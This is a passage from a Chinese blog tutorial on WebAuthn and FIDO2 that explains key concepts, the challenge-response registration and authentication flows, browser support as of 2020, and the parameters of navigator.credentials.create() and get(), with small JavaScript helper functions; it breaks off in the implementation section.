是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" 